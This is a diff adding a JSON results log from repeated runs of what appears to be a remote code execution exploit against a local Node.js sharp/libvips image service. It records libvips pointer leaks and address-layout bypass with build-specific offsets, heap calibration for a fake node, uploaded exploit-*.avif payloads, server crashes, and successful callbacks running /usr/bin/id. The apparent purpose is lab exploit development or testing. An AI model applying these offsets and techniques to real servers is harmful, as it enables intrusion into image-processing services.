+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 0,
+                "distinct_pointer_qwords": 0,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 4
+          },
+          {
+            "status": "selected",
+            "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7f303c400000",
+            "selected_anchors": [
+              {
+                "offset": "0x1be1b0",
+                "value": "0x7f303c5be1b0",
+                "repetitions": 1,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x538e0"
+                ]
+              },
+              {
+                "offset": "0x1c3120",
+                "value": "0x7f303c5c3120",
+                "repetitions": 1,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x538d8"
+                ]
+              },
+              {
+                "offset": "0x1c3130",
+                "value": "0x7f303c5c3130",
+                "repetitions": 1,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x538e8"
+                ]
+              }
+            ],
+            "rejected_candidates": [],
+            "supported_pair_count": 1,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "supported",
+                "reason": "exact_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 872,
+                "distinct_pointer_qwords": 386,
+                "supported_bases": [
+                  {
+                    "base": "0x7f303c400000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f303c5be1b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x538e0"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f303c5c3120",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x538d8"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f303c5c3130",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x538e8"
+                        ]
+                      }
+                    ]
+                  }
+                ],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7f301be57000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f301c01a120",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xa690"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f301ce58000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f301d0161b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x9f90"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f302feaf000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f3030072130",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x53568"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 5
+          },
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 14155,
+                "distinct_pointer_qwords": 657,
+                "supported_bases": [],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7f303c400000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f303c5c3120",
+                        "repetitions": 18,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x2138",
+                          "0x9548",
+                          "0x1f688",
+                          "0x26a98",
+                          "0x3cbd8",
+                          "0x43fe8",
+                          "0x5a128",
+                          "0x61538"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f303c5c3130",
+                        "repetitions": 18,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x2148",
+                          "0x9558",
+                          "0x1f698",
+                          "0x26aa8",
+                          "0x3cbe8",
+                          "0x43ff8",
+                          "0x5a138",
+                          "0x61548"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f301d007000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f301d1ca130",
+                        "repetitions": 18,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x9710",
+                          "0x97d0",
+                          "0x26c60",
+                          "0x26d20",
+                          "0x441b0",
+                          "0x44270",
+                          "0x61700",
+                          "0x617c0"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f303c3c9000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f303c58c120",
+                        "repetitions": 18,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x2140",
+                          "0x9550",
+                          "0x1f690",
+                          "0x26aa0",
+                          "0x3cbe0",
+                          "0x43ff0",
+                          "0x5a130",
+                          "0x61540"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 6
+          },
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 4661,
+                "distinct_pointer_qwords": 1897,
+                "supported_bases": [],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7f301fe66000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f3020029120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x110e0",
+                          "0x110e8"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f3020029130",
+                        "repetitions": 11,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6df40",
+                          "0x6df48",
+                          "0x6df50",
+                          "0x6df58",
+                          "0x6df60",
+                          "0x6df68",
+                          "0x6df70",
+                          "0x6df78"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f303d065000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f303d2231b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6f110"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f303d228120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6f688",
+                          "0x6f720"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f303c400000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f303c5c3120",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xf70f8"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f303c5c3130",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xf7108"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 7
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-1d0c0493d94e42249f2a6fb9fa639934.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 3,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7f217a400000",
+      "heap_calibration": {
+        "derived_selector": "0x5970",
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7f217a400000",
+            "response_sha256": "6b687bf83901eac4558505fe7f21d5236094bc2ef6fd835a0ee922e32051d21d",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 2,
+            "selected_anchor_rank": 0,
+            "matches": [
+              {
+                "response_offset": "0xf2808",
+                "arena_base": "0x7f2168000000",
+                "arena_sentinel": "0x7f2168000098",
+                "related_pointer": "0x7f216855fd60",
+                "related_pointer_delta": "0x68f30",
+                "anchor": "0x7f21684f6e30",
+                "anchor_page": "0x7f21684f6000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7f21684f72f0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7f217a73cd0f",
+                  "0x7f217a73de99",
+                  "0x7f217a5b8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7f21684f5970",
+                "derived_selector": "0x5970"
+              },
+              {
+                "response_offset": "0xf83c8",
+                "arena_base": "0x7f2168000000",
+                "arena_sentinel": "0x7f2168000098",
+                "related_pointer": "0x7f216855fd60",
+                "related_pointer_delta": "0x63370",
+                "anchor": "0x7f21684fc9f0",
+                "anchor_page": "0x7f21684fc000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7f21684fceb0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7f217a73cd0f",
+                  "0x7f217a73de99",
+                  "0x7f217a5b8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7f21684fb970",
+                "derived_selector": "0xb970"
+              }
+            ],
+            "candidate_selectors": [
+              "0x5970"
+            ],
+            "attempt": 3,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 3,
+        "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7f217a400000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f217a5be1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xd340"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f217a5c3120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xd338",
+              "0xf0e8",
+              "0x10168"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f217a5c3130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xd348",
+              "0xf0f8",
+              "0x10178"
+            ]
+          }
+        ],
+        "rejected_candidates": [],
+        "attempts": [
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 3,
+                "distinct_pointer_qwords": 1,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 1
+          },
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 0,
+                "distinct_pointer_qwords": 0,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 2
+          },
+          {
+            "status": "selected",
+            "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7f217a400000",
+            "selected_anchors": [
+              {
+                "offset": "0x1be1b0",
+                "value": "0x7f217a5be1b0",
+                "repetitions": 1,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0xd340"
+                ]
+              },
+              {
+                "offset": "0x1c3120",
+                "value": "0x7f217a5c3120",
+                "repetitions": 3,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0xd338",
+                  "0xf0e8",
+                  "0x10168"
+                ]
+              },
+              {
+                "offset": "0x1c3130",
+                "value": "0x7f217a5c3130",
+                "repetitions": 3,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0xd348",
+                  "0xf0f8",
+                  "0x10178"
+                ]
+              }
+            ],
+            "rejected_candidates": [],
+            "supported_pair_count": 1,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "supported",
+                "reason": "exact_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 5348,
+                "distinct_pointer_qwords": 2056,
+                "supported_bases": [
+                  {
+                    "base": "0x7f217a400000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f217a5be1b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xd340"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f217a5c3120",
+                        "repetitions": 3,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xd338",
+                          "0xf0e8",
+                          "0x10168"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f217a5c3130",
+                        "repetitions": 3,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xd348",
+                          "0xf0f8",
+                          "0x10178"
+                        ]
+                      }
+                    ]
+                  }
+                ],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7f2167e66000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f2168029120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xe8c90",
+                          "0xe8c98"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f2168029130",
+                        "repetitions": 11,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x823c0",
+                          "0x823c8",
+                          "0x823d0",
+                          "0x823d8",
+                          "0x823e0",
+                          "0x823e8",
+                          "0x823f0",
+                          "0x823f8"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f2167e57000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f21680151b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x11ba8"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f216801a130",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xb208",
+                          "0x121c0"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f217b065000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f217b2231b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x83590"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f217b228120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x83b08",
+                          "0x83ba0"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 3
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-b1766b25a1344117a4f6d4489462e98e.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 4,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7f934ec00000",
+      "heap_calibration": {
+        "derived_selector": "0x5970",
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7f934ec00000",
+            "response_sha256": "05530d6a907a82dda8cf11ffc0b08f1c5b44483ac17797992118d481f76826a6",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 2,
+            "selected_anchor_rank": 0,
+            "matches": [
+              {
+                "response_offset": "0xf2808",
+                "arena_base": "0x7f9338000000",
+                "arena_sentinel": "0x7f9338000098",
+                "related_pointer": "0x7f933855fd60",
+                "related_pointer_delta": "0x68f30",
+                "anchor": "0x7f93384f6e30",
+                "anchor_page": "0x7f93384f6000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7f93384f72f0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7f934ef3cd0f",
+                  "0x7f934ef3de99",
+                  "0x7f934edb8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7f93384f5970",
+                "derived_selector": "0x5970"
+              },
+              {
+                "response_offset": "0xf83c8",
+                "arena_base": "0x7f9338000000",
+                "arena_sentinel": "0x7f9338000098",
+                "related_pointer": "0x7f933855fd60",
+                "related_pointer_delta": "0x63370",
+                "anchor": "0x7f93384fc9f0",
+                "anchor_page": "0x7f93384fc000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7f93384fceb0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7f934ef3cd0f",
+                  "0x7f934ef3de99",
+                  "0x7f934edb8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7f93384fb970",
+                "derived_selector": "0xb970"
+              }
+            ],
+            "candidate_selectors": [
+              "0x5970"
+            ],
+            "attempt": 2,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 2,
+        "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7f934ec00000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f934edbe1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xd340"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f934edc3120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xd338",
+              "0xf0e8",
+              "0x10168"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f934edc3130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xd348",
+              "0xf0f8",
+              "0x10178"
+            ]
+          }
+        ],
+        "rejected_candidates": [],
+        "attempts": [
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 3,
+                "distinct_pointer_qwords": 1,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 1
+          },
+          {
+            "status": "selected",
+            "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7f934ec00000",
+            "selected_anchors": [
+              {
+                "offset": "0x1be1b0",
+                "value": "0x7f934edbe1b0",
+                "repetitions": 1,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0xd340"
+                ]
+              },
+              {
+                "offset": "0x1c3120",
+                "value": "0x7f934edc3120",
+                "repetitions": 3,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0xd338",
+                  "0xf0e8",
+                  "0x10168"
+                ]
+              },
+              {
+                "offset": "0x1c3130",
+                "value": "0x7f934edc3130",
+                "repetitions": 3,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0xd348",
+                  "0xf0f8",
+                  "0x10178"
+                ]
+              }
+            ],
+            "rejected_candidates": [],
+            "supported_pair_count": 1,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "supported",
+                "reason": "exact_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 5520,
+                "distinct_pointer_qwords": 2001,
+                "supported_bases": [
+                  {
+                    "base": "0x7f934ec00000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f934edbe1b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xd340"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f934edc3120",
+                        "repetitions": 3,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xd338",
+                          "0xf0e8",
+                          "0x10168"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f934edc3130",
+                        "repetitions": 3,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xd348",
+                          "0xf0f8",
